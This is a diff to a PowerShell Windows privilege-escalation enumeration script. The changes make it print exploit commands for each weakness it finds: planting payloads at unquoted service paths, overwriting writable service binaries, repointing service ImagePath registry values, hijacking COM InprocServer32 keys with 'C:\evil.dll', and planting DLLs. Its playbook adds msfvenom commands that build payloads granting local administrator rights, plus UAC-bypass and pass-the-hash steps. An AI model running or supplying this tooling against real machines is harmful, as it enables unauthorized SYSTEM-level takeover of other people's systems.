@@ -62,6 +62,50 @@ function TestWritable($path){
   return $false
 }
 
+# Return the writable ancestor directory of $path (or $null), so a finding can name
+# the EXACT folder to drop a payload in rather than "check the permissions".
+function Get-WritableAncestor($path){
+  $d = $path
+  for($i=0; $i -lt 8 -and $d; $i++){
+    if((Test-Path $d) -and (TestWritable $d)){ return $d }
+    $parent = Split-Path $d -Parent
+    if($parent -eq $d){ break }
+    $d = $parent
+  }
+  return $null
+}
+
+# Unquoted-service-path intercepts: the exact exe paths Windows tries BEFORE the
+# real target, each with the directory that must be writable to hijack it. This
+# turns "unquoted path" into "drop your exe at C:\Program Files\Foo.exe".
+function Get-UnquotedIntercepts($imagePath){
+  if(-not $imagePath){ return @() }
+  if($imagePath -match '^\s*"'){ return @() }                 # already quoted -> safe
+  $m = [regex]::Match($imagePath, '^(.*?\.exe)', 'IgnoreCase')
+  if(-not $m.Success){ return @() }
+  $full = $m.Groups[1].Value
+  if($full -notmatch ' '){ return @() }                       # no space -> not exploitable
+  $res = @()
+  $idx = 0
+  while(($idx = $full.IndexOf(' ', $idx)) -ge 0){
+    $cand = $full.Substring(0, $idx) + '.exe'
+    $dir  = Split-Path $cand -Parent
+    if($dir){ $res += [pscustomobject]@{ Exe=$cand; Dir=$dir; Writable=(TestWritable $dir) } }
+    $idx++
+  }
+  return $res
+}
+
+# The clean service-binary path (drop quotes + trailing args), for writability +
+# exact "copy over this file" guidance.
+function Get-ServiceBinary($imagePath){
+  if(-not $imagePath){ return $null }
+  if($imagePath -match '^\s*"([^"]+)"'){ return $Matches[1] }
+  $m = [regex]::Match($imagePath, '^(.*?\.exe)', 'IgnoreCase')
+  if($m.Success){ return $m.Groups[1].Value }
+  return ($imagePath -split '\s')[0]
+}
+
 # ============================================================ self-test (pre-flight)
 if($SelfTest){
   Write-Host "recce-enum.ps1 self-test - verifies the script + host; runs NO enumeration"
@@ -159,17 +203,39 @@ $svcs = Get-CimInstance Win32_Service
 foreach($s in $svcs){
   $p = $s.PathName
   if(-not $p){ continue }
-  # Unquoted service path with a space + running as a privileged account.
-  if($p -notmatch '^\s*"' -and $p -match ' ' -and $p -notmatch '^\s*[A-Za-z]:\\Windows\\'){
-    if($s.StartName -match 'LocalSystem|NT AUTHORITY'){ Finding ("Unquoted service path: " + $s.Name + " -> " + $p + " (" + $s.StartName + ")"); Flag UNQUOTED ($s.Name + " :: " + $p) }
+  $acct = $s.StartName
+  $priv = ($acct -match 'LocalSystem|NT AUTHORITY|LocalService|NetworkService') -or (-not $acct)
+  # 1) Unquoted service path -> compute the EXACT writable intercept exe.
+  if($p -notmatch '^\s*"' -and $p -match ' ' -and $p -notmatch '^\s*[A-Za-z]:\\Windows\\' -and $priv){
+    $ic = Get-UnquotedIntercepts $p
+    $w  = @($ic | Where-Object { $_.Writable })
+    if($w.Count){
+      foreach($c in $w){
+        Finding ("Unquoted service path EXPLOITABLE: service '" + $s.Name + "' runs as " + $acct +
+                 " -> plant your payload at  " + $c.Exe + "  (dir '" + $c.Dir + "' is writable), then: sc stop " + $s.Name + " & sc start " + $s.Name)
+        Flag UNQUOTED ($s.Name + " || plant: " + $c.Exe + " || runs-as: " + $acct)
+      }
+    } else {
+      Finding ("Unquoted service path: service '" + $s.Name + "' -> " + $p + " (" + $acct + ") - no intercept dir writable by THIS user (recheck under another account / after a foothold)")
+      Flag UNQUOTED_INFO ($s.Name + " :: " + $p)
+    }
   }
-  # Writable service binary -> replace it.
-  $bin = ($p -replace '^"','' -replace '".*$','') -replace '\s+[-/].*$',''
-  if($bin -match '\.exe$' -and (TestWritable $bin)){ Finding ("Writable service binary: " + $bin + " (" + $s.Name + ")"); Flag SVC_BIN ($s.Name + " :: " + $bin) }
+  # 2) Writable service binary -> the EXACT overwrite + restart.
+  $bin = Get-ServiceBinary $p
+  if($bin -and $bin -match '\.exe$' -and (TestWritable $bin)){
+    Finding ("Writable service binary EXPLOITABLE: " + $bin + "  (service '" + $s.Name + "' runs as " + $acct + ") -> copy /Y payload.exe `"" + $bin + "`" ; sc stop " + $s.Name + " & sc start " + $s.Name)
+    Flag SVC_BIN ($s.Name + " || overwrite: " + $bin + " || runs-as: " + $acct)
+  }
 }
-# Writable service registry keys (change ImagePath).
+# Writable service registry keys -> repoint ImagePath at your payload (EXACT cmd).
 Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services 2>$null | ForEach-Object {
-  if(TestWritable $_.PSPath){ Finding ("Writable service registry key: " + $_.PSChildName); Flag SVC_REG $_.PSChildName }
+  if(TestWritable $_.PSPath){
+    $svc = $_.PSChildName
+    Finding ("Writable service registry key EXPLOITABLE: " + $svc +
+             " -> reg add HKLM\SYSTEM\CurrentControlSet\Services\" + $svc +
+             " /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f ; then: sc start " + $svc)
+    Flag SVC_REG ($svc + " || reg ImagePath -> C:\payload.exe")
+  }
 } | Select-Object -First 20
 
 # ============================================================ scheduled tasks
@@ -413,16 +479,45 @@ $ui = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'User
 $sh = RegGet 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell'
 Info ("Winlogon Userinit=" + $ui + "  Shell=" + $sh + " (non-default values are suspicious / hijackable)")
 
-# ============================================================ PATH / writable dirs
-Sec "PATH & writable-directory hijack"
+# ============================================================ DLL hijack / PATH
+Sec "DLL hijacking & writable-directory / PATH abuse"
 Info ("PATH: " + $env:PATH)
-($env:PATH -split ';') | Where-Object { $_ } | ForEach-Object {
-  if((Test-Path $_) -and (TestWritable $_)){ Finding ("Writable dir in PATH: " + $_ + " (binary/DLL planting)"); Flag DLL_HIJACK ("PATH: " + $_) }
+# System PATH (hijacks DLLs/commands for SYSTEM services) vs user PATH.
+$sysPath = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name Path -ErrorAction SilentlyContinue).Path
+($env:PATH -split ';') | Where-Object { $_ } | Select-Object -Unique | ForEach-Object {
+  $dir = $_
+  if((Test-Path $dir) -and (TestWritable $dir)){
+    $inSys = ($sysPath -and (($sysPath -split ';') -contains $dir))
+    $scope = if($inSys){ "SYSTEM PATH (hijacks DLLs/commands loaded by SYSTEM services)" } else { "user PATH" }
+    Finding ("Writable directory in " + $scope + ": " + $dir + " -> plant a DLL any process loads by unqualified name (PATH is searched), or a name-shadowing .exe for a command a privileged job runs")
+    Flag DLL_HIJACK ("PATHdir: " + $dir + " || " + $scope)
+  }
 }
+# Writable Program Files app dirs: name the exe(s) so the hijack is concrete.
 foreach($pf in @("$env:ProgramFiles","${env:ProgramFiles(x86)}")){
-  Get-ChildItem $pf -Directory 2>$null | ForEach-Object {
-    if(TestWritable $_.FullName){ Finding ("Writable app dir under Program Files: " + $_.FullName + " (DLL hijack)"); Flag DLL_HIJACK ("ProgFiles: " + $_.FullName) }
-  } | Select-Object -First 10
+  if(-not $pf){ continue }
+  Get-ChildItem $pf -Directory -ErrorAction SilentlyContinue | Select-Object -First 40 | ForEach-Object {
+    $appdir = $_.FullName
+    if(TestWritable $appdir){
+      $exes = @(Get-ChildItem $appdir -Filter *.exe -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name)
+      $exeList = if($exes.Count){ ($exes -join ', ') } else { '(no top-level exe; check subfolders)' }
+      Finding ("Writable app dir (DLL hijack): " + $appdir + " -> exe(s): " + $exeList +
+               ". The app dir is searched FIRST, so drop a DLL one of these loads by name; confirm the exact DLL with ProcMon (Result=NAME NOT FOUND, Path ends .dll).")
+      Flag DLL_HIJACK ("AppDir: " + $appdir + " || exes: " + $exeList)
+    }
+  }
+}
+# Services whose binary sits in a writable dir -> DLL-hijack that service directly.
+foreach($sv in (Get-CimInstance Win32_Service)){
+  $b = Get-ServiceBinary $sv.PathName
+  if($b -and (Test-Path $b)){
+    $bd = Split-Path $b -Parent
+    if($bd -and ($bd -notmatch '^[A-Za-z]:\\Windows') -and (TestWritable $bd)){
+      Finding ("Service binary directory is writable (DLL hijack): service '" + $sv.Name + "' at " + $bd +
+               " -> plant a DLL '" + (Split-Path $b -Leaf) + "' loads, then restart the service (runs as " + $sv.StartName + ")")
+      Flag DLL_HIJACK ("SvcDir: " + $bd + " || svc: " + $sv.Name + " (" + $sv.StartName + ")")
+    }
+  }
 }
 
 # ============================================================ software / network
@@ -514,7 +609,12 @@ foreach($pf in @($PROFILE.AllUsersAllHosts, $PROFILE.CurrentUserAllHosts)){
 Info "COM hijack surface (writable HKCU CLSID InprocServer32), sampled:"
 Get-ChildItem 'HKCU:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | Select-Object -First 200 | ForEach-Object {
   $ips = Join-Path $_.PSPath 'InprocServer32'
-  if((Test-Path $ips) -and (TestWritable $ips)){ Finding ("Writable HKCU COM InprocServer32: " + $_.PSChildName); Flag COM_HIJACK $_.PSChildName }
+  if((Test-Path $ips) -and (TestWritable $ips)){
+    Finding ("Writable HKCU COM InprocServer32 (hijack): CLSID " + $_.PSChildName +
+             " -> reg add 'HKCU\SOFTWARE\Classes\CLSID\" + $_.PSChildName + "\InprocServer32' /ve /d C:\evil.dll /f" +
+             " (loads when a privileged app instantiates this CLSID)")
+    Flag COM_HIJACK ($_.PSChildName + " || InprocServer32 -> C:\evil.dll")
+  }
 }
 $wf = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue)
 $wc = @(Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue)
@@ -586,17 +686,15 @@ if(PbHas ADMIN_TOKEN){ Step "In Administrators but Medium integrity -> UAC bypas
   'run    : a fileless UAC bypass (fodhelper / computerdefaults / silentcleanup) to spawn a High-IL process.',
   'confirm: the new process runs at High integrity (whoami /groups -> High Mandatory Level)') }
 
-if(PbHas UNQUOTED){ Step "Unquoted service path -> plant an intercepting exe" ((PbVals UNQUOTED) + @(
-  'run    : for "C:\Program Files\Sub Dir\svc.exe" drop C:\Program.exe or "C:\Program Files\Sub.exe"',
-  '         (you need write access to that folder - check with icacls).',
-  '         sc stop <svc> & sc start <svc>   (or wait for reboot)',
-  'confirm: your exe runs as the service account (usually SYSTEM)')) }
+if(PbHas UNQUOTED){ Step "Unquoted service path -> plant the intercept exe (EXACT path per line)" ((PbVals UNQUOTED) + @(
+  'build  : msfvenom -p windows/x64/exec CMD="net localgroup administrators <you> /add" -f exe-service -o payload.exe',
+  'run    : copy payload.exe to the exact "plant:" path shown above; then: sc stop <svc> & sc start <svc>',
+  'confirm: the payload runs as the listed "runs-as" account (usually SYSTEM)')) }
 
-if(PbHas SVC_BIN -or PbHas SVC_REG){ Step "Writable service binary / registry key -> SYSTEM" (@() +
-  (PbVals SVC_BIN | ForEach-Object { $_ }) + (PbVals SVC_REG | ForEach-Object { "reg: " + $_ }) + @(
-  'binary : copy your exe over the service ImagePath binary.',
-  'registry: reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f',
-  'then   : sc stop <svc> & sc start <svc>   (or reboot)',
+if(PbHas SVC_BIN -or PbHas SVC_REG){ Step "Writable service binary / registry key -> SYSTEM (exact target per line)" (
+  (PbVals SVC_BIN) + (PbVals SVC_REG) + @(
+  'binary : copy /Y payload.exe over the "overwrite:" path shown; sc stop <svc> & sc start <svc>.',
+  'registry: run the exact "reg add ... ImagePath ..." line shown, then sc start <svc>.',
   'confirm: whoami in the payload  ->  nt authority\system')) }
 
 if(PbHas TASK_BIN){ Step "Writable scheduled-task binary -> run as the task principal" ((PbVals TASK_BIN) + @(
@@ -651,10 +749,12 @@ if(PbHas LATFP){ Step "LocalAccountTokenFilterPolicy=1 -> remote local-admin (Pt
   '         (or impacket-psexec administrator@<ip> -hashes :<nthash>)',
   'confirm: SYSTEM command output from the remote host') }
 
-if(PbHas DLL_HIJACK){ Step "Writable PATH / Program Files dir -> DLL hijack" ((PbVals DLL_HIJACK) + @(
-  'run    : identify a DLL a privileged app loads by name from this dir (ProcMon: NAME NOT FOUND on a DLL).',
-  '         drop a malicious DLL with that exact name -> code exec when the app starts.',
-  'confirm: your DLL loads in the privileged process')) }
+if(PbHas DLL_HIJACK){ Step "DLL hijack -> code exec in a privileged process (targets above)" ((PbVals DLL_HIJACK) + @(
+  'find   : ProcMon -> filter Result=NAME NOT FOUND and Path ends .dll for the target exe/service;',
+  '         that missing DLL name (searched in the writable dir above) is your exact target.',
+  'build  : msfvenom -p windows/x64/exec CMD="..." -f dll -o <MissingDll>.dll   (or a proxy/export-forwarding DLL',
+  '         so the app keeps working). Place it in the writable dir shown; start/restart the exe or service.',
+  'confirm: whoami inside the loaded DLL  ->  the app''s (often SYSTEM) context')) }
 
 if(PbHas STORED_CREDS -or PbHas BROWSER_CREDS -or PbHas APP_CREDS -or PbHas CLOUD -or PbHas UNATTEND){
   Step "Harvested credentials -> reuse & pivot" (
